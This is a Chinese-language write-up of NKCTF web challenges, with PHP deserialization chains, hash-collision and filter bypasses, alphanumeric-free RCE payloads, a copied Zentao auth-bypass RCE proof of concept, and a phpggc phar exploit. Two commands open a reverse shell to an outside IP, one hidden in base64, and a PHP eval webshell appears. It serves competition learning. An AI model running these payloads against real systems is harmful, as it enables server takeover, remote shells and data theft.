## baby_php

很简单的pop链，重点在读取文件时过滤的绕过

* 读取根目录

```
http://21593906-151e-4e36-a0b9-96900e7ad7a5.node1.yuzhian.com.cn/?p=O:7:"Welcome":2:{s:4:"name";s:16:"welcome_to_NKCTF";s:3:"arg";O:5:"Hell0":1:{s:4:"func";O:5:"Happy":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:5:"dir /";}}}
```

* 使用通配符绕过字母限制

```
http://21593906-151e-4e36-a0b9-96900e7ad7a5.node1.yuzhian.com.cn/?p=O:7:"Welcome":2:{s:4:"name";s:16:"welcome_to_NKCTF";s:3:"arg";O:5:"Hell0":1:{s:4:"func";O:5:"Happy":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:24:"sort /[d-h][1][0-z][d-h]";}}}
```

## eazy_php

* 绕过MD5

```
?a[]=1&b[]=2
```

* 绕过sha1 网上找好久找的碰撞案例

```
c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```


* intval 绕过  直接使用小数就可以

```
e=114514.5
```

* .等特殊字符会被转为_,只要前面使用[转换后后面的.就不会继续转换

```
NS[CTF.go=66
```

*无字母数字rce 直接把前段时间ctfshow rce大挑战第二关的payload扒下来

```
%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%3D%24%5F%5B%27%27%3D%3D%27%24%27%5D%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%5F%5F%5F%5F%3B%24%24%5F%5B%5F%5F%5D%28%24%24%5F%5B%5F%5D%29%3B&__=system&_=cat /f1agaaa
```

## EZPMS

网上的poc 

可以执行命令

```python
# -*- coding: UTF-8 -*-
# !/usr/bin/python
 
'''
权限绕过+RCE POC 伪静态传参版
禅道系统 影响版本 安全版本
开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2
旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2
企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2
'''
import requests
 
proxies = {
    #"http": "127.0.0.1:8080",
    #"https": "127.0.0.1:8080",
}
def check(url):
    url1 = url+'/misc-captcha-user.html'
    # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参
    # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接
    url3 = url + 'repo-create.html'
    url4 = url + 'repo-edit-10000-10000.html'
    headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
    }
 
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
        "Content-Type":"application/x-www-form-urlencoded",
        "X-Requested-With":"XMLHttpRequest",
        "Referer":url+"/repo-edit-1-0.html"
    }
 
    data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid='
    data2 = 'SCM=Subversion&client=`echo ZWNobyAiPD9waHAKc3lzdGVtKCJiYXNoIC1pID4mIC9kZXYvdGNwLzExNS4yMzYuMTUzLjE3NC8zOTA2MyAwPiYxIik7Ij4vd3d3L3plbnRhb3Btcy93d3cvc2hlbGwucGhw|base64 -d|sh`'
    data3 = 'SCM=Subversion&client=`cat /www/zentaopms/www/shell.php|tr \'\n\' \'~\'`'
    s=requests.session()
    try:
        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)
        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers2)
        req4 = s.post(url4,data=data3,proxies=proxies,timeout=5,verify=False,headers=headers2)
        # if 'bin' in req4.text:
        #     print(url,"")
        print(req4.text)

    except Exception as e:
        print(e)
    return False
if __name__ == '__main__':
    print(check("http://220d6023-adc1-4f56-847f-19adbc5b0e17.node2.yuzhian.com.cn/"))
```

但是只会回显一行，且权限太低读不到flag（放屁）

使用替换即可读到所有行

```
   data2 = 'SCM=Subversion&client=`cat shell* |tr \'\n\' \'~\'`'
```

先找网站根目录，找到了 在 

```
/www/zentaopms/www/
```

使用base64编码执行命令

```
echo  ******|base64 -d|sh
```

写一句话木马发现过滤了GET，POST

简单绕过一下

```php
<?php
$_=strtoupper('_post');
eval($$_['cmd']);
```

成功绕过失败，被改成了这样

```php
<?php
=strtoupper('_post');
eval(368_['cmd']);
```

也就是说 `$,POST,GET` 都被动态过滤掉,无字母数字也绕不过去，冰蝎的马都挂了

试试看能不能直接suid

```
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
```

好像没办法



* sudo -l

```
无
```

* software

```
\/usr\/bin\/curl
\/usr\/bin\/base64
\/usr\/bin\/socat
\/usr\/bin\/perl
\/usr\/bin\/php
```

* 定时任务

```
#/etc/crontab
SHELL=\/bin\/sh
PATH=\/usr\/local\/sbin:\/usr\/local\/bin:\/sbin:\/bin:\/usr\/sbin:\/usr\/bin
```



反弹shell

双urlencode

```
SCM=Subversion&client=`bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F115.236.153.174%252F39063%25200%253E%25261`'
```

不知道为什么接收不到



我超紫砂了，不用提权啊，卧槽卧槽卧槽，我日，为什么第一次读flag没读到，为什么

## hard_php

源码

```php
<?php
// not only ++
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['NKCTF'])) {
    $NK = $_POST['NKCTF'];
    if (is_string($NK)) {
        echo(strlen($NK));
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$NK) && strlen($NK) < 105){
            eval($NK);
        }else{
            echo("hacker!!!");
        }
    }else{
        phpinfo();
    }
}
?>
```

无字母数字rce，去rce大挑战取取经

rce3，4与题目相差不多，可以直接用

过滤了系统函数，采用什么读取文件呢

那当然是就在源码里的`highlight_file`捏

payload

```
NKCTF=$%ff=(%ff/%ff.'')[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&_=highlight_file&%ff=/flag
```



## webpagetest

是一个开源的网页测试网站，使用RequestBin发现好像并不能访问外网

Google 到的一篇文章 ：

https://thinkloveshare.com/hacking/preauth_remote_code_execution_web_page_test/

* 15分钟就发现的ssrf   tql

```
/jpeginfo/jpeginfo.php?url=http://172.18.0.1/ssrf
```

确实存在，但是没有vps也不能复现，花生壳也不支持web访问

* 反序列化

```
#生成phar文件
phpggc Monolog/RCE2 system 'cat /flag' -p phar -o testinfo.ini


URLENC_PAYLOAD=$(cat /tmp/testinfo.ini | xxd -p | tr -d "\n" | sed "s#..#%&#g")


curl -sSkig 'http://dd2425b2-de80-4dba-a3f2-66fd8ac4d4b3.node2.yuzhian.com.cn/runtest.php' -d 'rkey=gadget' -d "ini=$URLENC_PAYLOAD" -o -

curl -sSkig 'http://dd2425b2-de80-4dba-a3f2-66fd8ac4d4b3.node2.yuzhian.com.cn/runtest.php' -d 'rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo' -d "ini=$URLENC_PAYLOAD" -o -
```

反序列化拿到flag

![image-20230326022228541](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230326022228541.png)

## easy_cms

存在robots.txt ，随便访问一个disallow的url，发现是DedeCMS v5.7sp2

找到了很多洞，但因为关闭会员或者进入不了后台而无法实现

```
User-agent: * 
Disallow: /plus/ad_js.php
Disallow: /plus/advancedsearch.php
Disallow: /plus/car.php					
Disallow: /plus/carbuyaction.php	  403
Disallow: /plus/shops_buyaction.php   404
Disallow: /plus/erraddsave.php		挑错
Disallow: /plus/posttocar.php
Disallow: /plus/disdls.php			
Disallow: /plus/feedback_js.php		404
Disallow: /plus/mytag_js.php
Disallow: /plus/rss.php				404
Disallow: /plus/search.php
Disallow: /plus/recommend.php
Disallow: /plus/stow.php
Disallow: /plus/count.php
Disallow: /include
Disallow: /templets
```

盲猜是从上面的url中getshell

算了看看别的题目

## xiaopi

小皮面板的登录界面原本应该在一个随机的目录下，但是题目不用爆破，emmm

感觉没什么思路啊

